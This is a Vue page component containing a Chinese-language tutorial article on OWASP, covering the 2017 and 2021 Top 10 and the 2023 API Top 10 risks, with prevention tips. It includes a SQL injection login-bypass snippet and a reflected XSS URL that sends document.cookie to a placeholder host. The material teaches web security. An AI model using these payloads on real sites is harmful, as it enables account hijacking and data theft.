<template>
    <Header />
    <div class="content">
        <main>

            <section>
                <div class="article-heading">
                    <h2 class="article-heading">什麼是 OWASP？</h2>
                    <p><i class="fa-sharp fa-solid fa-calendar-days"></i>2023-07-31</p>
                </div>
            </section>

            <section>
                <div class="article-detail">
                    <h3>OWASP 簡介</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-txt">
                        <p>開放式 Web 應用程式安全性專案 (OWASP) 是致力於 Web 應用程式安全性的國際非營利組織。OWASP 的核心原則之一是，他們的所有資料都免費提供並且可以在其網站上輕鬆存取，這使得任何人都能夠改善自己的 Web 應用程式安全性。他們提供的材料包括文件、工具、影片和論壇。也許他們最著名的專案是 OWASP Top 10。</p>
                        <p>簡單的說就是推動世界軟體的安全性。OWASP 也歸納出容易攻擊的弱點並彙整為十大資安問題、排名、防範措施。</p>
                    </div>
                </div>
            </section>

            <section>
                <div class="article-detail">
                    <h3>OWASP 簡介</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-txt">
                        <p>開放式 Web 應用程式安全性專案 (OWASP) 是致力於 Web 應用程式安全性的國際非營利組織。OWASP 的核心原則之一是，他們的所有資料都免費提供並且可以在其網站上輕鬆存取，這使得任何人都能夠改善自己的 Web 應用程式安全性。他們提供的材料包括文件、工具、影片和論壇。也許他們最著名的專案是 OWASP Top 10。</p>
                    </div>
                </div>
            </section>
            
            <section>
                <div class="article-detail">
                    <h3>2017 OWASP TOP 10</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A1 Injection 注入攻擊</h4>
                        <p>偷偷串改造成語意改變就是 Injection，SQL Injection 就是駭客透過修改 SQL 來改變他原本語意，達到竊取資料/破壞資料的行為。</p>
                        <p>以登入功能來說，若程式邏輯是只要輸入框滿足條件 (等於 true) 就可以拿到使用者資料，那駭客就算不需要知道使用者真實密碼也可以藉由 SQL Injection 輕易拿到使用者資料</p>
                    </div>
                    <div class="article-coding">
<pre>
SELECT user_data FROM user_table
WHERE user_name = "Charmy"
AND paswword = "xx" or 1=1 --"
</pre>
                    </div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A2 Broken Authentication 無效身分認證(認證及驗證機制失效)</h4>
                        <p>Cookie 就像一張通行證，通行證裡面會存有一組 Session ID 來驗證身份，而網站通常是認通行證的。</p>
                        <h5>網站登入時的身分認證有缺陷，導致駭客能竊取相關登入資訊</h5>
                        <p>最容易理解的例子就是你在公共電腦登入之後忘記登出就離開電腦，駭客直接取用你的登入資訊</p>
                        <p>另外透過錯誤使用身份認證和會話(Session)管理功能，攻擊者能夠破解密碼或竊取 Session Token，或者利用其它開發漏洞來暫時性或永久性冒充其他用戶的身份。</p>
                        <p>Session 處理流程的最佳實踐有下列幾點</p>
                    </div>
                    <div class="article-list">
                        <ul>
                            <li><i class="fa-solid fa-check"></i>確保用 HTTPS 連線，避免封包被監聽導致密碼外洩</li>
                            <li><i class="fa-solid fa-check"></i>Client 端的 validation 都是無用的，因為使用者可以透過開發者工具改變，所以 Server 端一定要再做一次驗證</li>
                            <li><i class="fa-solid fa-check"></i>確保程式碼沒有 SQL Injection 漏洞</li>
                            <li><i class="fa-solid fa-check"></i>確保 cookie 設定為 HttpOnly (無法被 JavaScript 存取) 且 Session ID 應為不可被預測的</li>
                            <li><i class="fa-solid fa-check"></i>Session ID 不應該是固定不變且需要有時效性</li>
                        </ul>
                    </div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A3 Sensitive Data Exposure 敏感資料外洩(加密機制失效)</h4>
                        <h5>敏感資料保護度不足，使得駭客入侵系統後輕易竊取達成詐欺冒用等犯罪行為</h5>
                        <p>什麼是敏感資料？只要是不能公開的資料，就是敏感資料。</p>
                        <p>駭客可以用任何攻擊手法 XSS、SQL Injection、甚至只是在旁便等著你沒登出的電腦來讓敏感資料外洩</p>
                        <p>防護建議</p>
                    </div>
                    <div class="article-list">
                        <ul>
                            <li><i class="fa-solid fa-check"></i>使用 SSL 加密連線進行資料傳輸</li>
                            <li><i class="fa-solid fa-check"></i>以加密、雜湊(hash)等方式保存敏感資料，例如帳號密碼</li>
                            <li><i class="fa-solid fa-check"></i>檢查系統防火牆規則設定，限制所需的連接埠，定期查看內部是否有對外大量不同目的 IP 之異常連線，與帳號活動。</li>
                        </ul>
                    </div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A4 XML External Entity, XML 外部處理器漏洞</h4>
                        <h5>以 XML 為基礎的網路應用程式沒有做好相關權限保護而造成機敏資料外洩的風險</h5>
                        <h4><i class="fa-solid fa-book-open"></i>A5 Broken Access Control 無效的存取控管(權限控制失效)</h4>
                        <h5>駭客利用這些漏洞去存取沒有經過授權的功能或察看敏感資料、修改使用者數據、更改訪問權限等</h5>
                        <p><i class="fa-solid fa-pencil"></i>前端做得事：僅打開面向外部網路的 HTTP/HTTPS，不要連設定檔或其他檔都能讓駭客存取</p>
                        <h4><i class="fa-solid fa-book-open"></i>A6 Security Misconfiguration 不安全的組態設定(安全設定缺陷)</h4>
                        <h5>系統管理或配置不當所造成的安全性漏洞。</h5>
                        <p>例如系統預設帳密未更、錯誤的配置 HTTP 標頭、偵錯模式(Debug)未關閉，導致錯誤訊息中包含的敏感性個資外流都包含在內</p>
                        <p>簡單舉例就是在 github 忘記用 .gitignore 讓一些敏感資料例如資料庫存取密碼外流。或是管理 Google Drive 時分享變成所有人都可以檢視導致一些敏感文件外流</p>
                        <h4><i class="fa-solid fa-book-open"></i>A7 XSS (Cross-Site Scripting) 跨站攻擊</h4>
                        <h5>當網站沒有做好的驗證，就可以讓駭客輕易輸入惡意程式碼在網站上</h5>
                        <p>Cross-Site Scripting 主要是利用在輸入欄位輸入 JS 的 script tag 來造成攻擊 又可以分為三種常見類型：</p>
                    </div>
                    <div class="article-list">
                        <ul>
                            <li><i class="fa-solid fa-check"></i>Reflected</li>
                            <li><i class="fa-solid fa-check"></i>Persistent</li>
                            <li><i class="fa-solid fa-check"></i>DOM Based</li>
                        </ul>
                    </div>
                    <div class="article-txt">
                        <h5><i class="fa-regular fa-note-sticky"></i>Reflected</h5>
                        <p>利用網址輸入欄來執行惡意程式碼，因為輸入當下馬上被執行所以稱為 Reflected XXS</p>
                    </div>
                    <div class="article-codeNote">
<pre>
http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+document.cookie;&lt;/script>
</pre>
                    </div>
                    <div class="article-txt">
                        <p>藉由獲取的 document.cookie 登入使用者帳戶，然後拿信用卡盜刷或作任何他想做的事情</p>
                        <h5><i class="fa-regular fa-note-sticky"></i>Persistent/Stored XSS</h5>
                        <p>當使用者連到該網站便會遭受攻擊。不同的是惡意程式碼是被存到網站資料庫裡而不像 Reflected 是當下被輸入的</p>
                        <p>Hacker 先在留言區留一段惡意程式碼然後送出後存到資料庫中，因為網站會直接顯示資料庫的留言所以這段惡意程式碼也會直接被執行，讓駭客可以存取受害使用者資料。因為存到資料庫是永久的所以才叫 Persistent XSS</p>
                        <h5><i class="fa-regular fa-note-sticky"></i>DOM Based XSS</h5>
                        <p>DOM Based XSS 跟 Reflect 非常像，唯一不同是 DOM Based 惡意程式碼沒有到 server 端被執行而是直接在 client 端就被執行</p>
                        <p>當應用程式缺乏適當的驗證，如允許網頁可出現不可信任的資訊時，或者是允許在使用者瀏覽器中執行腳本程式，恐導致有心人士劫持使用者 session、網頁置換或者是轉址到其他惡意網站等。</p>
                    </div>
                    <div class="article-list">
                        <ul>
                            <li><i class="fa-solid fa-check"></i>可疑網址列 query</li>
                            <li><i class="fa-solid fa-check"></i>可疑表單，要重打帳密偷取資料</li>
                            <li><i class="fa-solid fa-check"></i>或是可以被轉址的網址 google.com 都要小心</li>
                        </ul>
                    </div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A8 Insecure Deserialization 不安全的反序列化漏洞</h4>
                        <h5>不安全的反序列化漏洞主要是鎖定 Java、PHP 或 Node.js 等常見的平臺。</h5>
                        <h4><i class="fa-solid fa-book-open"></i>A9 Using Components with Known Vulnerabilities 使用已有漏洞的元件(危險或過舊的元件)</h4>
                        <h4><i class="fa-solid fa-book-open"></i>A10 Insufficient Logging & Monitoring 紀錄與監控不足風險(資安記錄及監控失效)</h4>
                    </div>
                </div>
            </section>

            <section>
                <div class="article-detail">
                    <h3>2021 OWASP TOP 10</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-pic"><img src="../../assets/images/article-web/OWASP-2017-vs-2021.webp" alt=""></div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A1 Broken Access Control 權限控制失效</h4>
                        <p>94% 被測試的應用程式都有驗測到某種類別權限控制失效的問題。在權限控制失效這個類別中被對應到的 34 個 CWEs 在驗測資料中出現的次數都高於其他的弱點類別。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A2 Sensitive Data Exposure 加密機制失效</h4>
                        <p>在之前為 敏感資料外曝，在此定義下比較類似於一個廣泛的問題而非根本原因。在此重新定義並將問題核心定義在加密機制的失敗，並因此造成敏感性資料外洩或是系統被破壞。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A3 Injection 注入攻擊</h4>
                        <p>94% 被測試的應用程式都有驗測到某種類別注入式攻擊的問題。在注入式攻擊這個類別中被對應到的 33 個 CWEs 在驗測資料中出現的次數為弱點問題的第二高。跨站腳本攻擊現在在新版本屬於這個類別。</p>
                        <h4><i class="fa-solid fa-book-open"></i>(NEW)A4 Insecure Design 不安全設計</h4>
                        <p>如果真的希望讓整個產業"Move Left"(Move Left 於英文原文中代表在軟體開發及交付過程中，在早期找出及處理相關問題，同 Shift Left Testing。)，那必須進一步的往威脅建模，安全設計模塊的觀念，和安全參考架構前進。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A5 Security Misconfiguration 安全設定缺陷</h4>
                        <p>90% 被測試的應用程式都有驗測到某種類別的安全設定缺陷。在更多的軟體往更高度和有彈性的設定移動，並不意外這個類別的問題往上移動。在前版本中的 XML 外部實體注入攻擊 （XML External Entities）現在屬於這個類別</p>
                        <h4><i class="fa-solid fa-book-open"></i>A6 Using Components with Known Vulnerabilities 危險或過舊的元件</h4>
                        <p>唯一一個沒有任何 CVE 能被對應到 CWE 內的類別。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A7 Broken Authentication 認證及驗證機制失效</h4>
                        <p>有發現現在標準化的架構有協助降低次風險發生機率</p>
                        <h4><i class="fa-solid fa-book-open"></i>(NEW)A8 Software and Data Integrity Failures 軟體及資料完整性失效</h4>
                        <p>在軟體更新，機敏及重要資料，和 CI/CD 管道中並沒有做完整性的確認為前提做假設並進行評估。在評估中影響權重最高分的 CVE/CVSS 資料都與這類別中的 10 個 CWE 對應到。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A9 Insufficient Logging & Monitoring 資安記錄及監控失效</h4>
                        <p>這個類別將擴充去納入更多相關的缺失，但這也是相當難去驗證，並沒有相當多的 CVE/CVSS 資料可以佐證。但是在這個類別中的缺失會直接影響到整體安全的可視性，事件告警及鑑識。</p>
                        <h4><i class="fa-solid fa-book-open"></i>(NEW)A10 Server-Side Request Forgery(SSRF) 伺服端請求偽造</h4>
                        <p>這個類別的出現也是因為業界專家重複申明這類別的問題相當重要，即使在本次資料中並沒有足夠的資料去顯示這個問題。</p>
                    </div>
                </div>
            </section>

            <section>
                <div class="article-detail">
                    <h3>2023 OWASP TOP 10 API Security Risks</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-txt">
                        <h4><i class="fa-solid fa-book-open"></i>A1 Broken Object Level Authorization 不安全的物件授權</h4>
                        <p>API 多半以公開方式處理物件識別，因此產生與物件存取控制相關的大範圍受攻擊面。OWASP建議物件授權應考慮在每項功能設計中，以防未授權的資訊洩露、資料被竄改或破壞。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A2 Broken Authentication 無效身分認證</h4>
                        <p>身分認證在API中是另一個相對複雜且混亂的機制。身份驗證機制若實施不當，能使攻擊者破壞或利用身份驗證權杖，暫時或永久地冒用其他用戶的身份。破壞系統識別用戶端/使用者的能力，會損害 API整體安全。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A3 Broken Object Property Level Authorization 物件屬性級別授權失效</h4>
                        <p>風險的根本原因都是物件屬性級別的授權驗證缺失或不當，他可以確保用戶只能存取對應權限的資源或資料。失效的話，會導致資訊外洩或被未授權者篡改。 </p>
                        <h4><i class="fa-solid fa-book-open"></i>A4 Unrestricted Resource Consumption 不受限的資源消耗</h4>
                        <p>API常設計用來供查詢回傳資料，因此API會請求需要的網路頻寬、CPU、記憶體和儲存等資源。其他資源，如電子郵件 /SMS/ 電話或生物識別驗證，利用API整合由服務提供者提供，並按請求付費。成功的攻擊者可能利用這項風險，造成導致拒絕服務或增加營運成本。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A5 Broken Function Level Authorization 無效功能權限控管</h4>
                        <p>複雜的存取控制策略涉及不同的層級、組態和角色，並且在管理和常規功能之間沒有明確的分離，往往會導致授權漏洞。攻擊者將API請求發送到他們不應該存取，但暴露給匿名使用者或沒有權限的一般使用者的端點。利用這些問題，攻擊者可以存取其他用戶的資源和/或管理功能。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A6 Unrestricted Access to Sensitive Business Flows 不受限存取敏感商務流程</h4>
                        <p>易受此風險影響的API可能是自動化流程過度使用的功能，容易發生在購買票卷(車票、門票類)或評論的相關功能。這不一定是程式端的缺陷。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A7 Server Side Request Forgery 伺服器端請求偽造</h4>
                        <p>當API在未驗證使用者提供的 URI 的情況下獲取遠端資源時，可能會出現伺服器端請求偽造 (SSRF) 缺陷。這使攻擊者能夠強制應用程式將精心設計的請求發送到意想不到的目的地，即使受到防火牆或 VPN 的保護。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A8 Security Misconfiguration 安全組態錯誤</h4>
                        <p>API和支援系統通常包含複雜的配置，主要讓API更具彈性及客製化。軟體和DevOps工程師可能會忽視這些配置，或在配置方面未遵循安全最佳實踐，因而打開攻擊大門。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A9 Improper Inventory Management 庫存管理不當</h4>
                        <p>API通常比傳統Web應用程式暴露更多的端點，因此正確和更新文檔非常重要。對主機和API版本進行適當的管理也很重要，以減少如廢棄的API版本和暴露的測試端點等維護問題。</p>
                        <h4><i class="fa-solid fa-book-open"></i>A10 Unsafe Consumption of APIs API的不安全使用</h4>
                        <p>開發人員一般會更信任來自協力廠商API的資料，因此對協力廠商採取較弱的安全標準。為了破壞API，攻擊者會攻擊協力廠商服務，而不是直接嘗試破壞目標API。</p>
                    </div>
                </div>
            </section>

            <section>
                <div class="article-detail">
                    <h3>參考資料</h3>
                    <div class="article-detailLine"></div>
                    <div class="article-txt">
                        <a class="article-reference" href="https://www.cloudflare.com/zh-tw/learning/security/threats/owasp-top-10/" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Cloudflare - 什麼是 OWASP？什麼是 OWASP 十大漏洞？</a>
                        <a class="article-reference" href="https://medium.com/hannah-lin/%E5%B9%BC%E5%B9%BC%E7%8F%AD%E4%B9%9F%E8%83%BD%E6%87%82%E7%9A%84-owasp-top-10-692764c51f61#dd52" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Medium(Written by Hannah Lin) - 幼幼班也能懂的 2017 OWASP TOP 10</a>
                        <a class="article-reference" href="https://medium.com/starbugs/%E7%86%B1%E9%A8%B0%E9%A8%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8E%92%E8%A1%8C-2021-owasp-top-10-a3fa783d718" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Medium(Written by Hannah Lin) – 熱騰騰的漏洞排行榜 2021 OWASP TOP 10</a>
                        <a class="article-reference" href="https://owasp.org/Top10/zh_TW/" target="_blank"><i class="fa-solid fa-pen-to-square"></i>OWASP Top 10:2021</a>
                        <a class="article-reference" href="https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=10501" target="_blank"><i class="fa-solid fa-pen-to-square"></i>OWASP – OWASP發布 2023版十大 API 安全風險</a>
                    </div>
                </div>
            </section>

        </main>
        <Wall />
    </div>
    <BackToTop />
</template>
<script>
    import Header from "@/components/Header.vue";
    import Wall from "@/components/Wall.vue";
    import BackToTop from "@/components/BackToTop.vue";
    
    export default {
        components: {
            Header,
            Wall,
            BackToTop,
            // Footer,
        },
        setup() {}
    };
</script>